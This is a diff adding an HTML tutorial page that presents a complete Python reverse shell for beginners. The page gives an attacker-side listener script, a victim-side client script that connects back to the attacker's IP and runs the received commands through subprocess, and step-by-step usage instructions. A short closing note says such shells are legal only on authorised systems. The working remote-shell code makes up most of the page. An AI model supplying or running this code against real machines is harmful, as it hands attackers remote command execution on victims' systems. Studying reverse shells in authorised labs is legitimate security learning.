@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Python Reverse Shell - Full Explanation with Server and Client Code</title>
+
+  <meta name="description"
+    content="Understand what a Python Reverse Shell is, how it works, and see both server-side and client-side code with simple English explanations.">
+  <meta name="keywords"
+    content="Python reverse shell, ethical hacking, penetration testing, reverse shell script, client server python, socket programming">
+  <meta name="author" content="Rare Code Base">
+
+  <link rel="stylesheet" href="/css/styles.css">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+  <script src="/js/main.js" defer></script>
+  <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+
+  <div id="navbar-placeholder"></div>
+
+  <main class="d-lg-flex flex-nowrap d-block">
+
+    <div id="sidebar-placeholder"></div>
+
+    <div class="content">
+      <h1>Python Reverse Shell - Full Guide for Beginners</h1>
+
+      <p>
+        A <strong>reverse shell</strong> is a method used in ethical hacking where a victim's machine connects back to
+        the attacker's system. Once connected, the attacker can send commands to be executed on the victim’s system.
+      </p>
+
+      <h2>How Does a Reverse Shell Work?</h2>
+      <ul class="feature-list">
+        <li>The attacker starts a listener to wait for incoming connections.</li>
+        <li>The victim runs a script that connects back to the attacker's IP and port.</li>
+        <li>Once connected, the attacker can send shell commands to the victim system.</li>
+      </ul>
+
+      <h2>Server Side Script (Attacker Machine)</h2>
+      <p>This script runs on the attacker’s machine. It waits for a connection and sends commands:</p>
+
+      <pre><code>import socket  # For creating a network connection
+
+host = '0.0.0.0'  # Listen on all network interfaces
+port = 4444       # Port to listen on
+
+server_socket = socket.socket()  # Create a socket object
+server_socket.bind((host, port)) # Bind socket to host and port
+server_socket.listen(1)          # Allow only one connection
+
+print(f"Listening on {host}:{port}...")
+
+client_socket, client_address = server_socket.accept()  # Accept incoming connection
+print(f"Connection received from {client_address[0]}")
+
+while True:
+    command = input("Shell> ")  # Take input from attacker
+
+    if command.strip().lower() == "exit":
+        client_socket.send(b"exit")  # Send exit command to close connection
+        break
+
+    client_socket.send(command.encode())  # Send the command to the victim
+    result = client_socket.recv(4096).decode()  # Receive output from victim
+    print(result)  # Print the result
+
+client_socket.close()
+server_socket.close()</code></pre>
+
+      <h2>Client Side Script (Victim Machine)</h2>
+      <p>This script runs on the victim’s machine and connects back to the attacker:</p>
+
+      <pre><code>import socket      # For networking
+import subprocess  # To run system commands
+import os          # To change directories
+
+attacker_ip = '192.168.1.100'  # Replace with the attacker's IP
+attacker_port = 4444           # Port number used by attacker
+
+s = socket.socket()  # Create a socket
+s.connect((attacker_ip, attacker_port))  # Connect to attacker
+
+while True:
+    command = s.recv(1024).decode()  # Receive command from attacker
+
+    if command.lower() == 'exit':
+        break  # If command is 'exit', break the loop
+
+    if command.startswith('cd '):  # Handle directory change
+        try:
+            os.chdir(command[3:])  # Change directory
+            s.send(b'Changed directory.\n')
+        except FileNotFoundError:
+            s.send(b'Directory not found.\n')
+        continue
+
+    output = subprocess.getoutput(command)  # Run the command and get output
+    s.send(output.encode())  # Send output back to attacker
+
+s.close()  # Close the connection</code></pre>
+
+      <h2>How to Use This Reverse Shell?</h2>
+      <ul class="beginner-benefits">
+        <li><strong>Step 1:</strong> Set the correct IP and port in the client script.</li>
+        <li><strong>Step 2:</strong> Run the server script on the attacker’s machine.</li>
+        <li><strong>Step 3:</strong> Run the client script on the target (test) machine.</li>
+        <li><strong>Step 4:</strong> If successful, you will get a shell to the victim's system.</li>
+      </ul>
+
+      <h2>Is It Legal?</h2>
+      <p>
+        Reverse shells are legal only when used for:
+      </p>
+      <ul>
+        <li>Your own systems</li>
+        <li>Authorized penetration testing with written permission</li>
+        <li>Cybersecurity learning and lab environments (e.g., TryHackMe, HackTheBox)</li>
+      </ul>
+      <p>
+        <strong>Important:</strong> Using reverse shells on unauthorized systems is illegal and unethical.
+      </p>
+
+      <h2>Key Concepts You Learned</h2>
+      <ul>
+        <li><code>socket</code> – Used to connect client and server</li>
+        <li><code>subprocess</code> – Runs shell/system commands</li>
+        <li><code>os.chdir()</code> – Changes the current directory</li>
+        <li><code>send()</code> and <code>recv()</code> – Used for sending and receiving data between computers</li>
+      </ul>
+
+      <p>
+        This Python reverse shell example is useful for learning client-server communication and ethical hacking basics.
+        Always use it responsibly and only in legal environments.
+      </p>
+    </div>
+  </main>
+
+  <div id="footer-placeholder"></div>
+
+</body>
+
+</html>
